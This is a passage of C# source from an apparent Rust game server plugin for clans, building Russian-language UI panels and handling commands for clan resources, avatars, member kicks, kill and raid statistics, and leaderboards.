            }, Layer);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0.4 0", OffsetMin = "2 2", OffsetMax = "0 20" },
                Button = { Color = "0.1 0.9 0 0.7", Command = $"join {name}" },
                Text = { Text = $"ПРИНЯТЬ", Color = "1 1 1 0.8", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 14 }
            }, Layer);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.6 0", AnchorMax = "1 0", OffsetMin = "0 2", OffsetMax = "-2 20" },
                Button = { Color = "1 0 0 0.7", Close = Layer },
                Text = { Text = $"ОТКЛОНИТЬ", Color = "1 1 1 0.8", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 14 }
            }, Layer);

            CuiHelper.AddUi(player, container);
        }

        [ConsoleCommand("clan_setChange")]
        void cmdSetChangeOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null) return;

            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (clan.owner != player.UserIDString) return;
            var elements = new CuiElementContainer();

            CuiHelper.DestroyUi(player, "MainChange");

            elements.Add(new CuiPanel
            {
                CursorEnabled = true,
                Image = { Color = $"{HexToRustFormat("#322D246A")}", Material = "assets/content/ui/uibackgroundblur.mat" },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" }
            }, "MainClan", "MainChange");

            elements.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Close = "MainChange", Color = "0 0 0 0" }
            }, "MainChange");



            UI.AddImage(ref elements, "MainChange", "ClanChangeActive", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-400 -150", "-170 150");
            UI.AddImage(ref elements, "MainChange", "ClanChangeSelect", $"{HexToRustFormat("#74706A6D")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-160 -150", "400 150");
            UI.AddText(ref elements, "ClanChangeSelect", "Title1", "1 1 1 1", $"ВЫБЕРИТЕ РЕСУРСЫ", TextAnchor.MiddleCenter, 24, "0.5 0.5", "0.5 0.5", "-155 120", "150 155");
            UI.AddText(ref elements, "ClanChangeActive", "Title2", "1 1 1 1", $"ВЫБРАННЫЕ РЕСУРСЫ", TextAnchor.MiddleCenter, 20, "0.5 0.5", "0.5 0.5", "-145 120", "150 155");

            double offsetminx = 18, offsetminy = 211, offsetmaxx = 77, offsetmaxy = 270;
            int j = 0, h = 0;
            foreach (var item in clan.Change)
            {
                if (h == 9) break;
                UI.AddImage(ref elements, "ClanChangeActive", "Resource", $"{HexToRustFormat("#0000003E")}", "", "assets/icons/greyout.mat", "0 0", "0 0", $"{offsetminx} {offsetminy}", $"{offsetmaxx} {offsetmaxy}");
                UI.AddRawImage(ref elements, "Resource", "NeedIMG", GetImageUrl(item.Key, 0), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddText(ref elements, "Resource", "NeedAmount", "1 1 1 0.8", $"x{item.Value.Need}", TextAnchor.MiddleCenter, 14, "0 0", "0 0", "0 -20", "60 0");
                offsetminx += 72;
                offsetmaxx += 72;
                if (j == 2)
                {
                    offsetminx = 18;
                    offsetmaxx = 77;
                    offsetminy -= 90;
                    offsetmaxy -= 90;
                    j = 0;
                }
                else
                {
                    j++;
                }
                h++;
            }


            double offsetminx1 = -269, offsetminy1 = 61, offsetmaxx1 = -210, offsetmaxy1 = 121;
            int j1 = 0, h1 = 0;
            foreach (var item in clan.Change)
            {
                if (h1 == 9) break;
                UI.AddImage(ref elements, "ClanChangeSelect", $"Resource{h}", $"{HexToRustFormat("#0000003E")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", $"{offsetminx1} {offsetminy1}", $"{offsetmaxx1} {offsetmaxy1}");
                UI.AddRawImage(ref elements, $"Resource{h}", "SelectIMG", GetImageUrl(item.Key, 0), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddButton(ref elements, $"Resource{h}", "SelectBTN", $"UI_CLAN changeui {item.Key}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");

                offsetminx1 += 80;
                offsetmaxx1 += 80;
                if (j1 == 6)
                {
                    offsetminx1 = -269;
                    offsetmaxx1 = -210;
                    offsetminy1 -= 66;
                    offsetmaxy1 -= 66;
                    j1 = 0;
                }
                else
                {
                    j1++;
                }
                h1++;
            }


            CuiHelper.AddUi(player, elements);
        }

        void ClanChangeUi(BasePlayer player, string item)
        {
            var container = new CuiElementContainer();

            CuiHelper.DestroyUi(player, "MainChangeInput");

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                Image = { Color = $"0 0 0 0.9", Material = "assets/content/ui/uibackgroundblur.mat" },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" }
            }, "MainChange", "MainChangeInput");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Close = "MainChangeInput", Color = "0 0 0 0" }
            }, "MainChangeInput");

            UI.AddImage(ref container, "MainChangeInput", $"Panel", $"{HexToRustFormat("#00000062")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-200 -80", "200 80");
            UI.AddText(ref container, "Panel", "Title", "1 1 1 0.8", $"ВВЕДИТЕ КОЛИЧЕСТВО", TextAnchor.MiddleCenter, 24, "0 0", "1 1", "0 115", "0 12");
            UI.AddText(ref container, "Panel", "Title", "1 1 1 0.8", $"ДОПУСТИМЫЙ МАКСИМУМ: 100000", TextAnchor.MiddleCenter, 17, "0 0", "1 1", "0 55", "0 12");
            UI.AddImage(ref container, "Panel", $"ParentInput", $"{HexToRustFormat("#FFFFFF20")}", "", "assets/icons/greyout.mat", "0 0", "1 1", "50 37", "-50 -85");

            container.Add(new CuiElement()
            {
                Parent = $"ParentInput",
                Components =
                {
                    new CuiInputFieldComponent {Align = TextAnchor.MiddleCenter,CharsLimit = 6,FontSize = 15,
                        Command = $"clan_Change {item} ",Font = "robotocondensed-bold.ttf",Text = "ВВЕДИТЕ КОЛИЧЕСТВО И НАЖМИТЕ ENTER", Color = "1 0.9294118 0.8666667 1"},
                    new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                }
            });

            CuiHelper.AddUi(player, container);
        }

        [ConsoleCommand("clan_Change")]
        void cmdSetNewChangeOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();

            if (args.GetString(1) == "") return;

            int amount;
            if (!int.TryParse(args.Args[1], out amount)) return;

            var clan = findClanByUser(player.UserIDString);

            if (clan.Change.ContainsKey(args.Args[0]))
            {
                clan.Change[args.Args[0]].Need = amount;
            }

            cmdSetChangeOfClan(args);
        }

        class Position
        {
            public float Xmin;
            public float Xmax;
            public float Ymin;
            public float Ymax;

            public string AnchorMin =>
                $"{Math.Round(Xmin, 4).ToString(CultureInfo.InvariantCulture)} {Math.Round(Ymin, 4).ToString(CultureInfo.InvariantCulture)}";
            public string AnchorMax =>
                $"{Math.Round(Xmax, 4).ToString(CultureInfo.InvariantCulture)} {Math.Round(Ymax, 4).ToString(CultureInfo.InvariantCulture)}";

            public override string ToString()
            {
                return $"----------\nAmin:{AnchorMin}\nAmax:{AnchorMax}\n----------";
            }
        }

        [SuppressMessage("ReSharper", "CompareOfFloatsByEqualityOperator")]
        private static List<Position> GetPositions(int colums, int rows, float colPadding = 0, float rowPadding = 0, bool columsFirst = false)
        {
            if (colums == 0)
                throw new ArgumentException("Can't create positions for gui!", nameof(colums));
            if (rows == 0)
                throw new ArgumentException("Can't create positions for gui!", nameof(rows));

            List<Position> result = new List<Position>();
            result.Clear();
            var colsDiv = 1f / colums;
            var rowsDiv = 1f / rows;
            if (colPadding == 0) colPadding = colsDiv / 2;
            if (rowPadding == 0) rowPadding = rowsDiv / 2;
            if (!columsFirst)
                for (int j = rows; j >= 1; j--)
                {
                    for (int i = 1; i <= colums; i++)
                    {
                        Position pos = new Position
                        {
                            Xmin = (i - 1) * colsDiv + colPadding / 2f,
                            Xmax = i * colsDiv - colPadding / 2f,
                            Ymin = (j - 1) * rowsDiv + rowPadding / 2f,
                            Ymax = j * rowsDiv - rowPadding / 2f
                        };
                        result.Add(pos);
                    }
                }
            else
                for (int i = 1; i <= colums; i++)
                {
                    for (int j = rows; j >= 1; j--)
                    {
                        Position pos = new Position
                        {
                            Xmin = (i - 1) * colsDiv + colPadding / 2f,
                            Xmax = i * colsDiv - colPadding / 2f,
                            Ymin = (j - 1) * rowsDiv + rowPadding / 2f,
                            Ymax = j * rowsDiv - rowPadding / 2f
                        };
                        result.Add(pos);
                    }
                }
            return result;
        }
        [ConsoleCommand("clan_changeskin")]
        void cmdChatSkinOfClan(ConsoleSystem.Arg args)
        {
            if (args.GetString(1) == "") return;
            var player = args.Player();
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;

            ulong SkinID;
            if (!ulong.TryParse(args.Args[1], out SkinID)) return;
            if (string.IsNullOrEmpty(GetImageUrl(args.Args[0], SkinID)))
                ImageLibrary?.Call("AddImage", GetImageUrl(args.Args[0], SkinID), args.Args[0], SkinID);
            var value = clan.SkinList.FirstOrDefault(p => p.Value.ContainsKey(args.Args[0])).Key;
            clan.SkinList[value][args.Args[0]] = SkinID;
            NewClanUI(player);
        }

        [ConsoleCommand("clan_kickplayer")]
        void cmdKickOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            KickPlayer(player, args.Args[0]);
            NewClanUI(player);
        }


        public List<uint> IgnoreList = new List<uint>();

        void OnItemDropped(Item item, BaseEntity entity)
        {
            if (item == null) return;

            if (!IgnoreList.Contains(item.uid))
                IgnoreList.Add(item.uid);
        }

        void OnItemAddedToContainer(ItemContainer container, Item item)
        {
            if (IsBlocked() == 0) return;

            if (container.playerOwner == null || container.playerOwner.IsNpc) return;
            if (item.info.category != ItemCategory.Component && !item.info.shortname.Contains("scrap")) return;

            var player = container.playerOwner;
            if (player == null) return;
            if (player.inventory.loot != null && player.inventory.loot.entitySource != null && player.inventory.loot.entitySource.OwnerID != 0)
                return;

            var playerClan = findClanByUser(container.playerOwner.UserIDString);
            if (playerClan != null && playerClan.Res.ContainsKey(item.info.shortname))
            {
                NextTick(() =>
                {
                    if (player == null || playerClan == null || item == null) return;
                    playerClan.Res[item.info.shortname] += item.amount;

                });
            }
            if (playerClan == null) return;
            if (!HasSeenPlayer(container.playerOwner.userID, item) && playerClan.members[container.playerOwner.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
            {
                var itemKey = playerClan.members[container.playerOwner.UserIDString].GatherInfo[item.info.shortname];

                if (playerClan.Change.ContainsKey(item.info.shortname) && playerClan.Change[item.info.shortname].Complete < playerClan.Change[item.info.shortname].Need)
                {
                    playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Complete + item.amount;
                    playerClan.members[player.UserIDString].GatherInfo[item.info.shortname] = playerClan.members[player.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                    if (playerClan.Change[item.info.shortname].Complete > playerClan.Change[item.info.shortname].Need)
                        playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Need;
                }
                if (RewardGather.ContainsKey(item.info.shortname))
                {
                    playerClan.members[player.UserIDString].PlayerPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                    playerClan.ClanPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                }
                SetSeenPlayer(container.playerOwner.userID, item);
            }
        }

        private void CopySeenPlayers(Item @from, Item to)
        {
            if (!_looters.ContainsKey(@from.uid))
            {
                _looters[@from.uid] = new HashSet<ulong>();
            }
            if (!_looters.ContainsKey(to.uid))
            {
                _looters[to.uid] = new HashSet<ulong>();
            }
            _looters[to.uid].UnionWith(_looters[@from.uid]);
        }

        void CanStackItem(Item stack, Item item)
        {
            if (IsBlocked() == 0) return;
            if (item == null) return;
            if (item.info.category != ItemCategory.Component && !item.info.shortname.Contains("scrap")) return;

            var playerOwner = stack.GetOwnerPlayer();
            if (!playerOwner || playerOwner.IsNpc) return;
            var playerClan = findClanByUser(playerOwner.UserIDString);
            if (playerClan == null) return;
            bool canStack = stack != item && item.info.stackable > 1 &&
                            (stack.info.stackable > 1 && stack.info.itemid == item.info.itemid) &&
                            ((!item.hasCondition || (double)item.condition == (double)item.maxCondition) &&
                             (!stack.hasCondition || (double)stack.condition == (double)stack.maxCondition)) &&
                            (item.IsValid() && (!item.IsBlueprint() || item.blueprintTarget == stack.blueprintTarget));
            if (!canStack)
                return;
            if (playerOwner.inventory.loot != null && playerOwner.inventory.loot.entitySource != null && playerOwner.inventory.loot.entitySource.OwnerID != 0)
                return;
            CopySeenPlayers(item, stack);
            if (playerClan != null && playerClan.Res.ContainsKey(item.info.shortname))
            {
                NextTick(() =>
                {
                    if (playerOwner == null || playerClan == null || item == null) return;
                    playerClan.Res[item.info.shortname] += item.amount;

                });
            }
            if (!HasSeenPlayer(playerOwner.userID, item) && playerClan.members[playerOwner.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
            {

                var itemKey = playerClan.members[playerOwner.UserIDString].GatherInfo[item.info.shortname];

                if (playerClan.Change.ContainsKey(item.info.shortname) && playerClan.Change[item.info.shortname].Complete < playerClan.Change[item.info.shortname].Need)
                {
                    playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Complete + item.amount;
                    playerClan.members[playerOwner.UserIDString].GatherInfo[item.info.shortname] = playerClan.members[playerOwner.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                    if (playerClan.Change[item.info.shortname].Complete > playerClan.Change[item.info.shortname].Need)
                        playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Need;
                }
                if (RewardGather.ContainsKey(item.info.shortname))
                {
                    playerClan.members[playerOwner.UserIDString].PlayerPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                    playerClan.ClanPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                }
                SetSeenPlayer(playerOwner.userID, item);
            }

            if (_looters.ContainsKey(item.uid))
                _looters.Remove(item.uid);
        }

        private void SetSeenPlayer(ulong ownerId, Item item)
        {
            if (!_looters.ContainsKey(item.uid))
            {
                _looters[item.uid] = new HashSet<ulong> { ownerId };
            }

            if (_looters[item.uid].Contains(ownerId)) return;
            _looters[item.uid].Add(ownerId);
        }

        private Dictionary<uint, HashSet<ulong>> _looters = new Dictionary<uint, HashSet<ulong>>();


        private bool HasSeenPlayer(ulong ownerId, Item item)
        {
            if (item == null) return false;
            return _looters.ContainsKey(item.uid) && _looters[item.uid].Contains(ownerId);
        }

        [ConsoleCommand("clan_setAvatar")]
        void cmdSetAvatarOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            CuiHelper.DestroyUi(player, "clans_setAvatar");

            var elements = new CuiElementContainer();
            elements.Add(new CuiElement
            {
                Name = "clans_setAvatar",
                Parent = MainLayer,
                Components =
                    {
                        new CuiRawImageComponent {Color = "0 0 0 0.85",Sprite = "assets/content/ui/ui.background.tile.psd", Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" },
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });

            elements.Add(new CuiButton
            {
                Button = { Color = "0.13 0.44 0.48 0", Close = $"clans_setAvatar" },
                Text = { Text = "" },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
            }, $"clans_setAvatar");

            elements.Add(new CuiElement
            {
                Parent = "clans_setAvatar",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=25>НАСТРОЙКА АВАТАРА КЛАНА</size>\nУкажите прямую ссылку на аватар .png или .jpg. Скопируйте её заранее, и вставьте в окно ниже", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 14},
                        new CuiRectTransformComponent { AnchorMin = "0 0.7", AnchorMax = "1 1" },
                    }
            });

            elements.Add(new CuiElement
            {
                Name = "clans_setAvatar_input",
                Parent = "clans_setAvatar",
                Components =
                    {
                        new CuiRawImageComponent {Color = "0.3294118 0.3294118 0.3294118 0.5", Sprite = "assets/content/ui/ui.background.tile.psd" },
                        new CuiRectTransformComponent {AnchorMin = "0.05 0.45", AnchorMax = "0.8 0.55"}
                    }
            });

            elements.Add(new CuiElement
            {
                Parent = "clans_setAvatar_input",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=24>СКОПИРУЙТЕ СЮДА ССЫЛКУ И НАЖМИТЕ СОХРАНИТЬ</size>", Color = "1 0.9294118 0.8666667 0.05", Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" },
                    }
            });



            elements.Add(new CuiElement()
            {
                Parent = "clans_setAvatar_input",
                Components =
                {
                    new CuiInputFieldComponent
                    {
                        Align = TextAnchor.MiddleCenter,
                        CharsLimit = 80,
                        FontSize = 26,
                        Command = $"clan_changeAvatar ",
                        Font = "robotocondensed-bold.ttf",
                        Text = "",
                        Color = "1 0.9294118 0.8666667 1"
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0", AnchorMax = "1 1"
                    }
                }
            });

            elements.Add(new CuiButton
            {
                Button = { Color = "0.59 0.83 0.60 1.00", Command = "" },
                Text = { Text = "СОХРАНИТЬ", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", Color = "1 0.9294118 0.8666667 1" },
                RectTransform = { AnchorMin = $"1 0", AnchorMax = $"1.2 0.993" },
            }, "clans_setAvatar_input");

            CuiHelper.AddUi(player, elements);
        }


        [ConsoleCommand("clan_changeAvatar")]
        void cmdChangeAvatarOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (args.GetString(0) == "" || !args.Args[0].Contains("http") || !args.Args[0].Contains(".png") && !args.Args[0].Contains(".jpg")) return;

            var clan = findClanByUser(player.UserIDString);
            clan.ClanAvatar = args.Args[0];
            ImageLibrary.Call("AddImage", clan.ClanAvatar, clan.ClanAvatar);
            NewClanUI(player);
        }

        private Dictionary<uint, ulong> LastHeliHit = new Dictionary<uint, ulong>();
        private Dictionary<uint, ulong> LastBradleyAPCHit = new Dictionary<uint, ulong>();

        private BasePlayer GetLastHeliAttacker(uint heliNetId)
        {
            ulong player;
            LastHeliHit.TryGetValue(heliNetId, out player);
            return BasePlayer.FindByID(player);
        }
        private BasePlayer GetLastBradleyAPCAttacker(uint BradleyAPCNetId)
        {
            ulong player;
            LastBradleyAPCHit.TryGetValue(BradleyAPCNetId, out player);
            return BasePlayer.FindByID(player);
        }

        object OnItemPickup(Item item, BasePlayer player)
        {
            try
            {
                var clanss = findClanByUser((BasePlayer.FindByID(item.GetOwnerPlayer().OwnerID).ToString()));
                if (clanss != null && item != null)
                {
                    if (item.name.Contains("autoturret_deployed"))
                    {
                        if (clanss.turret > 0)
                            clanss.turret -= 1;
                    }
                }
            }
            catch (NullReferenceException)
            { }

            return null;
        }


        void OnEntityKill(BaseCombatEntity entity)
        {
            try
            {
                if (entity == null) return;
                var clanss = findClanByUser(BasePlayer.FindByID(entity.OwnerID).UserIDString);
                if (clanss == null) return;
                if (entity.PrefabName.Contains("cupboard.tool.deployed"))
                {
                    if (clanss.CupCount > 0)
                        clanss.CupCount -= 1;
                }
                if (entity.PrefabName.Contains("autoturret_deployed"))
                {
                    if (clanss.turret > 0)
                        clanss.turret -= 1;
                }
                if (entity.PrefabName.Contains("assets/prefabs/building core"))
                {
                    if (clanss.obj > 0)
                        clanss.obj -= 1;
                }
            }
            catch (NullReferenceException)
            { }
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if (info == null || entity?.net?.ID == null) return;

            if (entity is BaseHelicopter)
            {
                var newClan = findClanByUser(GetLastHeliAttacker(entity.net.ID).UserIDString);
                if (newClan == null) return;
                newClan.members[GetLastHeliAttacker(entity.net.ID).UserIDString].KilledHeli++;
                newClan.ClanPoints += PointsOfKilledHeli;
                newClan.members[GetLastHeliAttacker(entity.net.ID).UserIDString].PlayerPoints += PointsOfKilledHeli;
                return;
            }

            var player = info?.InitiatorPlayer;
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (entity is BradleyAPC && GetLastBradleyAPCAttacker(entity.net.ID) == player)
            {
                clan.members[player.UserIDString].KilledBradleyAPC++;
                clan.ClanPoints += PointsOfKilledBradleyAPC;
                clan.members[player.UserIDString].PlayerPoints += PointsOfKilledBradleyAPC;
            }
            if (entity.PrefabName.Contains("barrel"))
            {
                if (IsBlocked() == 0) return;
                clan.members[player.UserIDString].PlayerPoints += PointsOfBarrel;
                clan.ClanPoints += PointsOfBarrel;
                clan.Res["cratecostume"]++;
            }


            if (entity.ToPlayer() != null)
            {
                if (entity.GetComponent<NPCPlayer>() != null || IsNPC(entity.ToPlayer())) return;
                if (entity.ToPlayer() == info.Initiator.ToPlayer())
                {
                    clan.ClanPoints -= PointsOfSuicide;
                    clan.members[player.UserIDString].Suicide++;
                    clan.members[player.UserIDString].PlayerPoints -= PointsOfSuicide;
                }
                else
                {
                    clan.ClanPoints += PointsOfKilled;
                    clan.members[player.UserIDString].Killed++;
                    clan.KillC++;
                    clan.members[player.UserIDString].PlayerPoints += PointsOfKilled;
                }

            }
        }

        private bool IsNPC(BasePlayer player)
        {
            if (player == null) return false;
            if (player is NPCPlayer) return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L) || player.UserIDString.Length < 17) return true;
            return false;
        }

        int GetPercent(int need, int current) => current * 100 / need;

        double GetPercentFUll(double need, double current) => current * 100 / need;



        [ConsoleCommand("clanstop_info")]
        void cmdClansTopKey(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            var clan = findClan(arg.Args[0]);
            if (clan != null)
            {
                ClanTOPInfo(player, clan, arg.Args.Length > 1 ? int.Parse(arg.Args[1]) : 0);
            }
        }

        [ConsoleCommand("raidtop_info")]
        void cmdRaidTopKey(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            var clan = findClan(arg.Args[0]);
            if (clan != null)
            {
                RaidTOPInfo(player, clan, arg.Args.Length > 1 ? int.Parse(arg.Args[1]) : 0);
            }
        }


        [ConsoleCommand("clanstop_main")]
        void cmdClansTopMain(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            ClanTOP(player, arg.Args != null ? int.Parse(arg.Args[0]) : 0);
        }

        [ConsoleCommand("raidtop_main")]

        void cmdClansTopMainR(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            RaidTop(player, arg.Args != null ? int.Parse(arg.Args[0]) : 0);
        }

        [ChatCommand("rtop")]
        void cmdClanTOPR(BasePlayer player, string command, string[] args)
        {
            RaidTop(player, 0);
        }

        [ChatCommand("ctop")]
        void cmdClanTOP(BasePlayer player, string command, string[] args)
        {
            ClanTOP(player, 0);
        }

        public int GetClanIndex(string key)
        {
            var ClanMembers = from pair in clans orderby pair.Value.ClanPoints descending select pair;
            int index = 1;
            foreach (KeyValuePair<string, Clan> clanIndex in ClanMembers)
            {
                if (clanIndex.Value.tag == key)
                    return index;
                index++;
            }
            return 0;
        }

        string GetPlayerStatus(string player, Clan clan)
        {
            string status = "";

            if (clan == null) return "Обычный игрок";
            if (clan.members.ContainsKey(player)) status = "Участник";
            if (clan.moderators.Contains(player)) status = "Капитан";
            if (clan.owner.Contains(player)) status = "Лидер";
            return status;
        }


        string RaidInfo = "RaidInfoLayer";
        void RaidTOPInfo(BasePlayer player, Clan clan, int page)
        {
            CuiHelper.DestroyUi(player, "MainClanInfo");
            CuiHelper.DestroyUi(player, "MainTop");
            CuiHelper.DestroyUi(player, "MainTopR");
            CuiHelper.DestroyUi(player, "RaidInfoLayer");

            var container = new CuiElementContainer();
            var color = clan.online > 0 ? "0.55 0.78 0.24 1" : "0.8 0.28 0.2 1";

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = $"{HexToRustFormat("#322D2499")}", Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", "MainClanInfo");


            UI.AddButton(ref container, "MainClanInfo", "CloseOverlay", "", "MainClanInfo", "0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
            UI.AddImage(ref container, "MainClanInfo", RaidInfo, $"{HexToRustFormat("#74706A7F")}", "", "assets/icons/greyout.mat", "0.5 0.5", "0.5 0.5", "-257 -220", "257 220");

            if (clan.ClanAvatar.Contains("png") == false || clan.ClanAvatar.Contains("jpg") == false)
            {
                UI.AddRawImage(ref container, RaidInfo, "Avatar", GetImageUrl(clan.owner, 0), "1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-223 59", "-96 185");
            }
            else
            {
                UI.AddRawImage(ref container, RaidInfo, "Avatar", ImageLibrary?.Call<string>("GetImage", clan.ClanAvatar), "1 1 1 1", "", "", "0.5 0.5", "0.5 0.5", "-223 59", "-96 185");
            }

            UI.AddText(ref container, RaidInfo, "ClanName", "1 1 1 1", $"{clan.tag}", TextAnchor.MiddleLeft, 20, "0.5 0.5", "0.5 0.5", "0 180", "150 225");
            UI.AddText(ref container, RaidInfo, "ClanOnline", $"{color}", $"●", TextAnchor.MiddleCenter, 14, "0.5 0.5", "0.5 0.5", "-20 190", "0 210");
            Dictionary<string, string> infoDict = new Dictionary<string, string>()
            {
                {"ГЛАВА КОМАНДЫ", clan.ownerName},
                {"ИГРОКОВ В КОМАНДЕ", clan.members.Count.ToString()},
                {"НАБРАНО ОЧКОВ", clan.ClanPoints.ToString()},
                {"ВСЕГО РЕЙДОВ", clan.KilledTCAll.ToString()},
                {"ВСЕГО УБИЙСТВ", clan.KillC.ToString()},
                {"ВСЕГО СМЕРТЕЙ", clan.DeathC.ToString()}
            };

            float offsetminh = 161, offsetmaxh = 181;
            foreach (var kvp in infoDict)
            {
                string text = kvp.Key;
                string text2 = kvp.Value;
                UI.AddImage(ref container, RaidInfo, $"ClanInfoBlackBars", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-67 {offsetminh}", $"228 {offsetmaxh}");
                UI.AddText(ref container, $"ClanInfoBlackBars", "1", "1 1 1 0.8", $"{text}", TextAnchor.MiddleLeft, 14, "0 0", "0 0", "5 0", "150 20");
                UI.AddText(ref container, $"ClanInfoBlackBars", "2", "1 1 1 0.8", $"{text2}", TextAnchor.MiddleRight, 12, "0 0", "0 0", "170 0", "290 20");
                offsetminh -= 22;
                offsetmaxh -= 22;
            }

            float offsetminl = 13, offsetmaxl = 62;
            foreach (var check in clan.Res)
            {
                UI.AddImage(ref container, RaidInfo, $"ClanFarmParent", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", $"-257 -17", $"257 31");
                UI.AddImage(ref container, "ClanFarmParent", $"ClanFarm", $"{HexToRustFormat("#47433DB0")}", "", "", "0 0", "0 0", $"{offsetminl} 0", $"{offsetmaxl} 48");
                UI.AddRawImage(ref container, "ClanFarm", "1", ImageLibrary?.Call<string>("GetImage", check.Key), $"1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddText(ref container, $"ClanFarm", "2", "1 1 1 0.8", $"{check.Value}", TextAnchor.MiddleRight, 12, "0 0", "0 0", "0 -5", "45 20");

                offsetminl += 56;
                offsetmaxl += 56;
                if (offsetminl > 461)
                {
                    offsetminl = 13;
                    offsetmaxl = 62;
                }
            }

            UI.AddImage(ref container, RaidInfo, $"TextParent", $"0 0 0 0", "", "", "0.5 0.5", "0.5 0.5", $"-257 -55", $"257 -35");
            UI.AddText(ref container, "TextParent", "1", "1 1 1 0.8", "#", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "12 -2", "33 20");
            UI.AddText(ref container, "TextParent", "2", "1 1 1 0.8", "ИМЯ ИГРОКА", TextAnchor.LowerLeft, 13, "0 0", "0 0", "57 -2", "153 20");
            UI.AddText(ref container, "TextParent", "3", "1 1 1 0.8", "ОЧКОВ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "260 -2", "303 20");
            UI.AddText(ref container, "TextParent", "4", "1 1 1 0.8", "АКТИВНОСТЬ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "308 -2", "383 20");
            UI.AddText(ref container, "TextParent", "5", "1 1 1 0.8", "УБИЙСТВ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "388 -2", "443 20");
            UI.AddText(ref container, "TextParent", "6", "1 1 1 0.8", "СМЕРТЕЙ", TextAnchor.LowerLeft, 13, "0 0", "0 0", "448 -2", "523 20");


            var ClanMembers = from pair in clan.members orderby pair.Value.PlayerPoints descending select pair;
            float offsethmin = -80, offsethmax = -57;
            int i = 1;
            foreach (KeyValuePair<string, PlayerStats> key in ClanMembers.Skip(5 * page).Take(ClanMembers.ToList().Count >= 5 ? 5 : ClanMembers.ToList().Count))
            {
                var name = covalence.Players.FindPlayerById(key.Key) != null ? covalence.Players.FindPlayerById(key.Key).Name : "Имя не указано";
                UI.AddImage(ref container, ClanInfo, "ClanMember", $"{HexToRustFormat("#0000006E")}", "", "", "0.5 0.5", "0.5 0.5", $"-254 {offsethmin}", $"256 {offsethmax}");
                UI.AddText(ref container, "ClanMember", "1", "1 1 1 0.8", $"{page * 5 + i}", TextAnchor.MiddleCenter, 13, "0 0", "0 0", "5 0", "30 25");
                UI.AddText(ref container, "ClanMember", "2", "1 1 1 0.8", $"{name}", TextAnchor.MiddleLeft, 13, "0 0", "0 0", "55 0", "200 25");
